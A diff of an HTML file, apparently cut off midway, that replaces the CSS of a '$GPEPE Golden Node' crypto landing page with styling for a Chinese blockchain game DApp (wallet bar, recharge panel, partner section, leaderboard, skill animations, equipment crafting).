@@ -3,2236 +3,1664 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>$GPEPE Golden Node</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+  <title>考拉传奇人生 - 链上传奇DApp</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
+    
     body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 50%, #0f0f23 100%);
+      font-family: 'Microsoft YaHei', 'SimHei', sans-serif;
       min-height: 100vh;
-      color: #fff;
-      padding-bottom: 50px;
+      background: 
+        radial-gradient(ellipse at 30% 20%, rgba(138, 43, 226, 0.2) 0%, transparent 50%),
+        radial-gradient(ellipse at 70% 80%, rgba(255, 69, 0, 0.15) 0%, transparent 50%),
+        linear-gradient(180deg, #0a0a0f 0%, #1a0a1f 50%, #0f0a15 100%);
+      color: #e0e0e0;
+      overflow-x: hidden;
     }
-    .container { max-width: 480px; margin: 0 auto; padding: 20px; }
-    
-    .hero-img {
-      width: 100%;
-      border-radius: 16px;
-      margin-bottom: 20px;
-      box-shadow: 0 0 30px rgba(255,215,0,0.3);
-    }
-    
-    .header {
-      text-align: center;
-      padding: 20px 0;
-      background: linear-gradient(135deg, #ffd700, #ff8c00);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-    }
-    .header h1 { font-size: 36px; font-weight: 800; letter-spacing: 3px; }
-    .header .subtitle { font-size: 14px; color: #888; margin-top: 8px; }
-    
-    .tagline {
-      text-align: center;
-      font-size: 14px;
-      color: #aaa;
-      margin: 20px 0;
-      line-height: 1.8;
-    }
-    
-    .wallet-section {
-      background: rgba(255,255,255,0.05);
-      border: 2px solid rgba(255,215,0,0.4);
-      border-radius: 16px;
-      padding: 20px;
-      margin: 20px 0;
-      text-align: center;
-    }
-    .wallet-btn {
-      background: linear-gradient(135deg, #ffd700, #ff8c00);
-      color: #000;
-      border: none;
-      padding: 16px 50px;
-      border-radius: 30px;
-      font-size: 18px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: all 0.3s;
-      box-shadow: 0 4px 15px rgba(255,215,0,0.3);
-    }
-    .wallet-btn:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(255,215,0,0.6); }
-    .wallet-info { margin-top: 15px; font-size: 14px; color: #888; }
-    .wallet-address { color: #ffd700; font-family: monospace; font-size: 16px; }
-    
-    .stats-grid {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 15px;
-      margin: 20px 0;
-    }
-    .stat-card {
-      background: rgba(255,255,255,0.05);
-      border: 1px solid rgba(255,215,0,0.3);
-      border-radius: 12px;
-      padding: 20px;
-      text-align: center;
-    }
-    .stat-label { font-size: 12px; color: #888; margin-bottom: 8px; }
-    .stat-value { font-size: 28px; font-weight: 700; color: #ffd700; }
-    
-    .referral-section {
-      display: grid;
-      grid-template-columns: 1fr;
-      gap: 15px;
-      margin: 20px 0;
-    }
-    
-    .referral-card {
-      background: rgba(255,255,255,0.05);
-      border: 1px solid rgba(255,215,0,0.2);
-      border-radius: 12px;
-      padding: 20px;
-    }
-    
-    .referral-card h3 {
-      font-size: 18px;
-      color: #ffd700;
-      margin-bottom: 10px;
-    }
-    
-    .referral-label {
-      font-size: 12px;
-      color: #888;
-      margin-bottom: 8px;
-    }
-    
-    .referral-link {
-      font-size: 12px;
-      color: #00d4ff;
-      word-break: break-all;
-      padding: 10px;
-      background: rgba(0,0,0,0.3);
-      border-radius: 8px;
-      margin-bottom: 12px;
-      font-family: monospace;
-    }
-    
-    .referrer-address {
-      font-size: 12px;
-      color: #fff;
-      word-break: break-all;
-      padding: 10px;
-      background: rgba(0,0,0,0.3);
-      border-radius: 8px;
-      font-family: monospace;
-    }
-    
-    .copy-btn {
-      background: linear-gradient(135deg, #00d4ff, #0099cc);
-      color: #fff;
-      border: none;
-      padding: 10px 24px;
-      border-radius: 8px;
-      font-size: 14px;
-      font-weight: bold;
-      cursor: pointer;
-      width: 100%;
-      transition: transform 0.2s;
-    }
-    
-    .copy-btn:hover {
-      transform: translateY(-2px);
-    }
-    
-    .node-section {
-      background: rgba(255,255,255,0.05);
-      border: 2px solid rgba(255,215,0,0.4);
-      border-radius: 16px;
-      padding: 25px;
-      margin: 20px 0;
-    }
-    .node-section h2 {
-      text-align: center;
-      font-size: 22px;
-      margin-bottom: 20px;
-      color: #ffd700;
-    }
-    .node-price {
-      text-align: center;
-      font-size: 42px;
-      font-weight: 800;
-      color: #ffd700;
-      margin: 20px 0;
-      text-shadow: 0 0 20px rgba(255,215,0,0.5);
-    }
-    .node-price span { font-size: 18px; color: #888; }
-    
-    .buy-btn {
-      width: 100%;
-      background: linear-gradient(135deg, #ffd700, #ff8c00);
-      color: #000;
-      border: none;
-      padding: 20px;
-      border-radius: 30px;
-      font-size: 20px;
-      font-weight: 700;
-      cursor: pointer;
-      margin-top: 20px;
-      transition: all 0.3s;
-      box-shadow: 0 4px 15px rgba(255,215,0,0.3);
-    }
-    .buy-btn:hover { transform: scale(1.02); box-shadow: 0 0 30px rgba(255,215,0,0.6); }
-    
-    .log-box {
-      background: rgba(0,0,0,0.5);
-      border: 1px solid rgba(255,215,0,0.3);
-      border-radius: 12px;
-      padding: 15px;
-      margin: 20px 0;
-      max-height: 200px;
-      overflow-y: auto;
-      font-family: 'Courier New', monospace;
-      font-size: 12px;
-    }
-    .log-entry { margin: 5px 0; padding: 5px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
-    .log-success { color: #4ade80; }
-    .log-error { color: #ef4444; }
-    .log-info { color: #60a5fa; }
-    
-    .section-title {
-      text-align: center;
-      margin: 40px 0 30px;
-    }
-    .section-title h2 {
-      font-size: 32px;
-      font-weight: 800;
-      background: linear-gradient(135deg, #ffd700, #ff8c00);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      letter-spacing: 4px;
-      font-style: italic;
-    }
-    .section-title .sub {
-      font-size: 14px;
-      color: #888;
-      margin-top: 10px;
-      letter-spacing: 2px;
-    }
-    
-    .why-cards {
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-      margin: 20px 0;
-    }
-    .why-card {
-      background: rgba(255,255,255,0.03);
-      border-radius: 16px;
-      padding: 25px;
-      text-align: center;
-      position: relative;
-      overflow: hidden;
-    }
-    .why-card.green {
-      border: 2px solid rgba(34,197,94,0.5);
-      background: linear-gradient(135deg, rgba(34,197,94,0.1), transparent);
-    }
-    .why-card.black {
-      border: 2px solid rgba(100,100,100,0.5);
-      background: linear-gradient(135deg, rgba(50,50,50,0.2), transparent);
-    }
-    .why-card.gold {
-      border: 2px solid rgba(255,215,0,0.5);
-      background: linear-gradient(135deg, rgba(255,215,0,0.1), transparent);
-      box-shadow: 0 0 30px rgba(255,215,0,0.2);
-    }
-    .why-card .circle {
-      width: 60px;
+
+    /* 导航栏 */
+    .navbar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
       height: 60px;
-      border-radius: 50%;
-      margin: 0 auto 15px;
-    }
-    .why-card.green .circle {
-      background: radial-gradient(circle, #4ade80, #22c55e);
-      box-shadow: 0 0 20px rgba(34,197,94,0.5);
-    }
-    .why-card.black .circle {
-      background: radial-gradient(circle, #6b7280, #374151);
-      box-shadow: 0 0 20px rgba(100,100,100,0.3);
-    }
-    .why-card.gold .circle {
-      background: radial-gradient(circle, #ffd700, #ff8c00);
-      box-shadow: 0 0 20px rgba(255,215,0,0.5);
-    }
-    .why-card h3 {
-      font-size: 18px;
-      font-weight: 700;
-      margin-bottom: 10px;
-    }
-    .why-card.green h3 { color: #4ade80; }
-    .why-card.black h3 { color: #9ca3af; }
-    .why-card.gold h3 { color: #ffd700; }
-    .why-card p {
-      font-size: 13px;
-      color: #888;
-      line-height: 1.6;
-    }
-    
-    .mechanism-section {
-      margin: 40px 0;
-    }
-    .mechanism-grid {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 15px;
-    }
-    .mechanism-card {
-      background: rgba(255,255,255,0.03);
-      border: 1px solid rgba(255,215,0,0.3);
-      border-radius: 12px;
-      padding: 20px;
-    }
-    .mechanism-card .icon {
-      font-size: 32px;
-      margin-bottom: 12px;
-    }
-    .mechanism-card h4 {
-      font-size: 14px;
-      font-weight: 700;
-      color: #ffd700;
-      margin-bottom: 5px;
-    }
-    .mechanism-card .chinese-title {
-      font-size: 12px;
-      color: #666;
-      margin-bottom: 10px;
-    }
-    .mechanism-card p {
-      font-size: 12px;
-      color: #888;
-      line-height: 1.5;
-    }
-    
-    .roadmap-section {
-      margin: 40px 0;
-    }
-    .roadmap-timeline {
-      position: relative;
-      padding-left: 40px;
-    }
-    .roadmap-timeline::before {
-      content: '';
-      position: absolute;
-      left: 15px;
-      top: 0;
-      bottom: 0;
-      width: 2px;
-      background: linear-gradient(180deg, #ffd700, rgba(255,215,0,0.3));
-    }
-    .roadmap-item {
-      position: relative;
-      margin-bottom: 30px;
-    }
-    .roadmap-item:last-child { margin-bottom: 0; }
-    .roadmap-item::before {
-      content: '';
-      position: absolute;
-      left: -30px;
-      top: 5px;
-      width: 12px;
-      height: 12px;
-      border-radius: 50%;
-      background: #ffd700;
-      box-shadow: 0 0 10px rgba(255,215,0,0.5);
-    }
-    .roadmap-item.green::before {
-      background: #22c55e;
-      box-shadow: 0 0 10px rgba(34,197,94,0.5);
-    }
-    .roadmap-item.silver::before {
-      background: #9ca3af;
-      box-shadow: 0 0 10px rgba(156,163,175,0.5);
-    }
-    .roadmap-item.gold::before {
-      background: #ffd700;
-    }
-    .roadmap-item.blue::before {
-      background: #3b82f6;
-      box-shadow: 0 0 10px rgba(59,130,246,0.5);
-    }
-    .roadmap-card {
-      background: rgba(255,255,255,0.03);
-      border: 1px solid rgba(255,215,0,0.3);
-      border-radius: 12px;
-      padding: 18px;
-    }
-    .roadmap-card .phase {
-      font-size: 12px;
-      color: #ffd700;
-      font-weight: 600;
-      margin-bottom: 5px;
-    }
-    .roadmap-card h4 {
-      font-size: 16px;
-      font-weight: 700;
-      color: #fff;
-      margin-bottom: 10px;
-    }
-    .roadmap-card ul {
-      list-style: none;
-    }
-    .roadmap-card li {
-      font-size: 12px;
-      color: #888;
-      padding: 4px 0;
-    }
-    
-    .distribution-section {
-      margin: 40px 0;
-      text-align: center;
-    }
-    .distribution-ring {
-      width: 180px;
-      height: 180px;
-      border-radius: 50%;
-      border: 12px solid #ffd700;
-      border-right-color: rgba(255,215,0,0.2);
-      border-bottom-color: rgba(255,215,0,0.2);
-      margin: 0 auto 20px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      box-shadow: 0 0 30px rgba(255,215,0,0.3);
-    }
-    .distribution-ring .inner {
-      font-size: 36px;
-      font-weight: 800;
-      color: #ffd700;
-    }
-    .distribution-ring .inner span {
-      font-size: 14px;
-      display: block;
-      font-weight: 400;
-      color: #888;
-    }
-    .distribution-boxes {
-      display: flex;
-      gap: 15px;
-      margin-top: 20px;
-    }
-    .dist-box {
-      flex: 1;
-      background: rgba(255,255,255,0.03);
-      border: 1px solid rgba(255,215,0,0.3);
-      border-radius: 12px;
-      padding: 15px;
-      text-align: center;
-    }
-    .dist-box .percent {
-      font-size: 24px;
-      font-weight: 700;
-      color: #ffd700;
-    }
-    .dist-box .label {
-      font-size: 12px;
-      color: #888;
-      margin-top: 5px;
-    }
-    
-    .footer-img {
-      width: 100%;
-      border-radius: 12px;
-      margin-top: 30px;
-    }
-    
-    .meme-gallery {
-      margin: 40px 0;
-    }
-    .meme-grid {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 10px;
-    }
-    .meme-item {
-      aspect-ratio: 1;
-      border-radius: 12px;
-      background: rgba(255,255,255,0.05);
-      border: 1px solid rgba(255,215,0,0.2);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 48px;
-    }
-    
-    .golden-army-section {
-      position: relative;
-      margin-top: 30px;
-      padding: 40px 20px;
-      border-radius: 16px;
-      overflow: hidden;
-    }
-    
-    .golden-army-bg {
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: linear-gradient(135deg, #0a0a0f 0%, #1a1000 50%, #0a0a0f 100%);
-      opacity: 0.9;
-    }
-    
-    .golden-army-bg::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Ccircle cx='20%25' cy='30%25' r='2' fill='%23ffd700' opacity='0.3'/%3E%3Ccircle cx='80%25' cy='20%25' r='1.5' fill='%23ffd700' opacity='0.2'/%3E%3Ccircle cx='50%25' cy='70%25' r='2' fill='%23ffd700' opacity='0.25'/%3E%3Ccircle cx='30%25' cy='80%25' r='1' fill='%23ffd700' opacity='0.3'/%3E%3Ccircle cx='70%25' cy='60%25' r='1.5' fill='%23ffd700' opacity='0.2'/%3E%3C/svg%3E");
-      background-size: 200px 200px;
-    }
-    
-    .golden-army-content {
-      position: relative;
-      z-index: 1;
-      text-align: center;
-      padding: 20px 0;
-    }
-    
-    .army-title {
-      font-size: 36px;
-      font-weight: bold;
-      color: #ffd700;
-      text-shadow: 0 0 30px rgba(255,215,0,0.5), 0 0 60px rgba(255,215,0,0.3);
-      margin: 0 0 15px 0;
-      font-family: 'Georgia', serif;
-      letter-spacing: 2px;
-    }
-    
-    .army-subtitle {
-      font-size: 20px;
-      color: #ffd700;
-      margin-bottom: 10px;
-      font-weight: bold;
-    }
-    
-    .army-desc {
-      font-size: 14px;
-      color: rgba(255,255,255,0.7);
-      margin-bottom: 25px;
-      line-height: 1.6;
-    }
-    
-    .telegram-btn {
-      background: linear-gradient(135deg, #ffd700, #ffb700);
-      color: #000;
-      border: none;
-      padding: 12px 40px;
-      border-radius: 8px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      box-shadow: 0 4px 20px rgba(255,215,0,0.4);
-      transition: transform 0.2s, box-shadow 0.2s;
-    }
-    
-    .telegram-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 6px 30px rgba(255,215,0,0.5);
-    }
-    
-    .tags-bar {
-      position: relative;
-      z-index: 1;
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-      justify-content: center;
-      margin-top: 30px;
-      padding: 15px;
-      background: rgba(0,0,0,0.3);
-      border-top: 1px solid rgba(255,215,0,0.2);
-      border-bottom: 1px solid rgba(255,215,0,0.2);
-    }
-    
-    .tag-item {
-      background: rgba(255,215,0,0.1);
-      border: 1px solid rgba(255,215,0,0.3);
-      color: #ffd700;
-      padding: 8px 16px;
-      border-radius: 20px;
-      font-size: 12px;
-      font-weight: bold;
-      letter-spacing: 1px;
-    }
-    
-    .golden-pepe-footer {
-      position: relative;
-      z-index: 1;
-      text-align: center;
-      padding: 30px 0 10px;
-    }
-    
-    .golden-pepe-footer h3 {
-      font-size: 28px;
-      color: #ffd700;
-      margin: 0;
-      font-family: 'Georgia', serif;
-      letter-spacing: 3px;
-    }
-    
-    .footer-sub {
-      font-size: 14px;
-      color: rgba(255,215,0,0.6);
-      margin-bottom: 10px;
-    }
-    
-    .footer-desc {
-      font-size: 14px;
-      color: rgba(255,255,255,0.6);
-      margin-bottom: 20px;
-    }
-    
-    .footer-buy-btn {
-      background: linear-gradient(135deg, #ffd700, #ffb700);
-      color: #000;
-      border: none;
-      padding: 12px 30px;
-      border-radius: 8px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      box-shadow: 0 4px 20px rgba(255,215,0,0.4);
-      transition: transform 0.2s;
-    }
-    
-    .footer-buy-btn:hover {
-      transform: scale(1.05);
-    }
-    
-    .lang-btn {
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      padding: 10px 20px;
-      border-radius: 24px;
-      border: 1px solid rgba(255,215,0,0.3);
-      background: linear-gradient(135deg, #1a1a2e, #16213e);
-      color: #fff;
-      font-size: 14px;
-      cursor: pointer;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-      z-index: 1000;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      transition: transform 0.2s, box-shadow 0.2s;
-    }
-    
-    .lang-btn:hover {
-      transform: scale(1.05);
-      box-shadow: 0 6px 20px rgba(0,0,0,0.4);
-    }
-    
-    .lang-icon {
-      font-size: 18px;
-    }
-    
-    .lang-panel {
-      position: fixed;
-      top: 70px;
-      right: 20px;
-      width: 180px;
-      background: linear-gradient(135deg, #1a1a2e, #16213e);
-      border: 1px solid rgba(255,215,0,0.3);
-      border-radius: 12px;
-      padding: 8px;
-      z-index: 999;
-      display: none;
-      box-shadow: 0 8px 25px rgba(0,0,0,0.4);
-    }
-    
-    .lang-panel.show {
-      display: block;
-    }
-    
-    .lang-option {
-      padding: 12px 16px;
-      border-radius: 8px;
-      cursor: pointer;
-      color: #fff;
-      font-size: 14px;
+      background: rgba(0, 0, 0, 0.8);
+      border-bottom: 1px solid rgba(255, 215, 0, 0.3);
       display: flex;
       align-items: center;
       justify-content: space-between;
+      padding: 0 20px;
+      z-index: 1000;
+      backdrop-filter: blur(10px);
+    }
+
+    .nav-logo {
+      font-size: 20px;
+      font-weight: bold;
+      color: #ffd700;
+      text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+    }
+
+    .nav-wallet {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+
+    .wallet-address {
+      font-size: 12px;
+      color: #ffd700;
+      font-family: monospace;
+      max-width: 150px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .sound-btn {
+      width: 36px;
+      height: 36px;
+      border: none;
+      border-radius: 50%;
+      background: rgba(255, 215, 0, 0.2);
+      color: #ffd700;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .sound-btn:hover {
+      background: rgba(255, 215, 0, 0.4);
+      transform: scale(1.1);
+    }
+
+    .btn {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    .btn-connect {
+      background: linear-gradient(135deg, #ffd700, #ff8c00);
+      color: #000;
+      box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
+    }
+
+    .btn-connect:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 20px rgba(255, 215, 0, 0.5);
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #ff6b00, #ff4500);
+      color: #fff;
+      box-shadow: 0 0 15px rgba(255, 107, 0, 0.3);
+    }
+
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 20px rgba(255, 107, 0, 0.5);
+    }
+
+    .btn-partner {
+      background: linear-gradient(135deg, #22c55e, #16a34a);
+      color: #fff;
+      box-shadow: 0 0 15px rgba(34, 197, 94, 0.3);
+    }
+
+    .btn-partner:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 20px rgba(34, 197, 94, 0.5);
+    }
+
+    .btn-game {
+      background: linear-gradient(135deg, #4a0080, #8000ff);
+      color: #fff;
+      box-shadow: 0 0 15px rgba(128, 0, 255, 0.3);
+    }
+
+    .btn-game:hover {
+      box-shadow: 0 5px 25px rgba(128, 0, 255, 0.5);
+    }
+
+    .btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    /* 主内容区 */
+    .main-container {
+      margin-top: 80px;
+      padding: 20px;
+      max-width: 800px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    /* 状态卡片 */
+    .status-card {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 15px;
+      padding: 20px;
+      border: 1px solid rgba(255, 215, 0, 0.2);
+      margin-bottom: 20px;
+      backdrop-filter: blur(10px);
+    }
+
+    .status-header {
+      font-size: 18px;
+      font-weight: bold;
+      color: #ffd700;
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .status-header::before {
+      content: '⚡';
+    }
+
+    .balance-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 15px;
+    }
+
+    .balance-item {
+      background: rgba(255, 215, 0, 0.1);
+      padding: 15px;
+      border-radius: 10px;
+      text-align: center;
+      border: 1px solid rgba(255, 215, 0, 0.2);
+    }
+
+    .balance-label {
+      font-size: 12px;
+      color: #9ca3af;
+      margin-bottom: 5px;
+    }
+
+    .balance-value {
+      font-size: 20px;
+      font-weight: bold;
+      color: #ffd700;
+      font-family: monospace;
+    }
+
+    /* 充值区域 */
+    .recharge-section {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 15px;
+      padding: 25px;
+      border: 1px solid rgba(255, 69, 0, 0.3);
+      margin-bottom: 20px;
+    }
+
+    .section-title {
+      font-size: 18px;
+      font-weight: bold;
+      color: #ff6b00;
+      margin-bottom: 20px;
+      text-align: center;
+      text-shadow: 0 0 15px rgba(255, 107, 0, 0.5);
+    }
+
+    .input-group {
+      margin-bottom: 15px;
+    }
+
+    .input-label {
+      font-size: 13px;
+      color: #9ca3af;
+      margin-bottom: 8px;
+      display: block;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 12px 15px;
+      border: 1px solid rgba(255, 215, 0, 0.3);
+      border-radius: 8px;
+      background: rgba(0, 0, 0, 0.5);
+      color: #ffd700;
+      font-size: 14px;
+      font-family: monospace;
+    }
+
+    .input-field:focus {
+      outline: none;
+      border-color: #ffd700;
+      box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+    }
+
+    .presets {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 15px;
+      flex-wrap: wrap;
+    }
+
+    .preset-btn {
+      padding: 8px 15px;
+      background: rgba(255, 215, 0, 0.1);
+      border: 1px solid rgba(255, 215, 0, 0.3);
+      border-radius: 5px;
+      color: #ffd700;
+      font-size: 12px;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    .preset-btn:hover {
+      background: rgba(255, 215, 0, 0.2);
+      border-color: #ffd700;
+    }
+
+    .preset-btn.active {
+      background: #ffd700;
+      color: #000;
+    }
+
+    /* 地推合伙人区域 */
+    .partner-section {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 15px;
+      padding: 25px;
+      border: 1px solid rgba(34, 197, 94, 0.3);
+      margin-bottom: 20px;
+    }
+
+    .partner-section .section-title {
+      color: #22c55e;
+      text-shadow: 0 0 15px rgba(34, 197, 94, 0.5);
+    }
+
+    .partner-info {
+      background: rgba(34, 197, 94, 0.1);
+      padding: 15px;
+      border-radius: 10px;
+      margin-bottom: 15px;
+      border: 1px solid rgba(34, 197, 94, 0.2);
+      text-align: center;
+    }
+
+    .partner-price {
+      font-size: 24px;
+      font-weight: bold;
+      color: #22c55e;
+    }
+
+    .partner-desc {
+      font-size: 12px;
+      color: #9ca3af;
+      margin-top: 5px;
+    }
+
+    /* 游戏区域 */
+    .game-section {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 15px;
+      padding: 25px;
+      border: 1px solid rgba(128, 0, 255, 0.3);
+      margin-bottom: 20px;
+    }
+
+    .game-title {
+      font-size: 20px;
+      font-weight: bold;
+      color: #ffd700;
+      text-align: center;
+      margin-bottom: 20px;
+      text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+    }
+
+    .game-tabs {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+
+    .game-tab {
+      padding: 10px 20px;
+      background: rgba(128, 0, 255, 0.1);
+      border: 1px solid rgba(128, 0, 255, 0.3);
+      border-radius: 8px;
+      color: #e0e0e0;
+      font-size: 14px;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+
+    .game-tab:hover {
+      background: rgba(128, 0, 255, 0.2);
+    }
+
+    .game-tab.active {
+      background: linear-gradient(135deg, #8000ff, #4a0080);
+      color: #fff;
+      border-color: #8000ff;
+      box-shadow: 0 0 15px rgba(128, 0, 255, 0.5);
+    }
+
+    .game-panel {
+      display: none;
+    }
+
+    .game-panel.active {
+      display: block;
+    }
+
+    /* 战力排行榜 */
+    .leaderboard-container {
+      background: rgba(0, 0, 0, 0.6);
+      border-radius: 12px;
+      padding: 20px;
+      border: 1px solid rgba(255, 215, 0, 0.3);
+    }
+
+    .leaderboard-title {
+      font-size: 20px;
+      font-weight: bold;
+      color: #ffd700;
+      text-align: center;
+      margin-bottom: 15px;
+      text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+    }
+
+    .leaderboard-header {
+      display: grid;
+      grid-template-columns: 1fr 2fr 1fr 1fr 1fr;
+      font-size: 12px;
+      color: #888;
+      padding-bottom: 10px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      margin-bottom: 10px;
+    }
+
+    .leaderboard-list {
+      list-style: none;
+      padding: 0;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+
+    .leaderboard-item {
+      display: grid;
+      grid-template-columns: 1fr 2fr 1fr 1fr 1fr;
+      align-items: center;
+      padding: 10px;
+      border-radius: 8px;
+      margin-bottom: 5px;
       transition: background 0.2s;
     }
-    
-    .lang-option:hover {
-      background: rgba(255,255,255,0.1);
+
+    .leaderboard-item:hover {
+      background: rgba(255, 215, 0, 0.1);
     }
-    
-    .lang-option.active {
-      background: rgba(255,215,0,0.2);
+
+    .leaderboard-item.top-1 {
+      background: linear-gradient(135deg, rgba(255, 215, 0, 0.2), rgba(255, 215, 0, 0.05));
+      border: 1px solid rgba(255, 215, 0, 0.3);
     }
-    
-    .lang-check {
-      color: #ffd700;
+
+    .leaderboard-item.top-2 {
+      background: linear-gradient(135deg, rgba(192, 192, 192, 0.2), rgba(192, 192, 192, 0.05));
+      border: 1px solid rgba(192, 192, 192, 0.3);
+    }
+
+    .leaderboard-item.top-3 {
+      background: linear-gradient(135deg, rgba(205, 127, 50, 0.2), rgba(205, 127, 50, 0.05));
+      border: 1px solid rgba(205, 127, 50, 0.3);
+    }
+
+    .rank-number {
       font-weight: bold;
+      font-size: 14px;
+    }
+
+    .rank-number.top-1 { color: #ffd700; }
+    .rank-number.top-2 { color: #c0c0c0; }
+    .rank-number.top-3 { color: #cd7f32; }
+
+    .my-rank {
+      margin-top: 15px;
+      padding: 10px;
+      background: rgba(128, 0, 255, 0.2);
+      border-radius: 8px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    /* 技能特效 */
+    @keyframes slash {
+      0% { transform: translateX(0) rotate(0deg); opacity: 1; }
+      50% { transform: translateX(80px) rotate(45deg); opacity: 0.8; }
+      100% { transform: translateX(150px) rotate(90deg); opacity: 0; }
+    }
+
+    .slash-effect {
+      position: absolute;
+      width: 80px;
+      height: 5px;
+      background: linear-gradient(90deg, #ff4500, #ffd700, transparent);
+      border-radius: 3px;
+      box-shadow: 0 0 15px #ff4500, 0 0 30px #ffd700;
+      z-index: 100;
+      animation: slash 0.4s ease-out forwards;
+    }
+
+    @keyframes magicCircle {
+      0% { transform: scale(0) rotate(0deg); opacity: 1; }
+      50% { transform: scale(1.2) rotate(180deg); opacity: 0.8; }
+      100% { transform: scale(1) rotate(360deg); opacity: 0; }
+    }
+
+    .magic-circle {
+      position: absolute;
+      width: 100px;
+      height: 100px;
+      border: 3px solid #9333ea;
+      border-radius: 50%;
+      z-index: 100;
+      animation: magicCircle 0.6s ease-out forwards;
+    }
+
+    .magic-circle::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 60px;
+      height: 60px;
+      border: 2px solid #a855f7;
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    .magic-circle::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 30px;
+      height: 30px;
+      background: #9333ea;
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      box-shadow: 0 0 20px #9333ea;
+    }
+
+    @keyframes arrowFly {
+      0% { transform: translateX(0); opacity: 1; }
+      100% { transform: translateX(300px); opacity: 0; }
+    }
+
+    .arrow-projectile {
+      position: absolute;
+      font-size: 20px;
+      z-index: 100;
+      animation: arrowFly 0.5s linear forwards;
+    }
+
+    @keyframes screenShake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
+    }
+
+    .shake {
+      animation: screenShake 0.2s ease-in-out;
+    }
+
+    /* 装备合成 */
+    .equipment-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 15px;
+    }
+
+    .equipment-item {
+      background: rgba(0, 0, 0, 0.5);
+      border-radius: 10px;
+      padding: 15px;
+      text-align: center;
+      border: 1px solid rgba(255, 215, 0, 0.15);
+      transition: all 0.3s;
+      cursor: pointer;
+    }
+
+    .equipment-item:hover {
+      transform: translateY(-3px);
+      border-color: rgba(255, 215, 0, 0.4);
+      box-shadow: 0 5px 15px rgba(255, 215, 0, 0.2);
+    }
+
+    .equipment-item.disabled {
+      opacity: 0.5;
+      pointer-events: none;
+    }
+
+    .equipment-icon {
+      font-size: 32px;
+      margin-bottom: 10px;
+    }
+
+    .equipment-name {
+      font-size: 14px;
+      font-weight: bold;
+      color: #ffd700;
+      margin-bottom: 5px;
+    }
+
+    .equipment-cost {
+      font-size: 12px;
+      color: #ff8c00;
+    }
+
+    .equipment-level {
+      font-size: 11px;
+      color: #9ca3af;
+      margin-top: 5px;
+    }
+
+    /* 任务系统 */
+    .quest-list {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
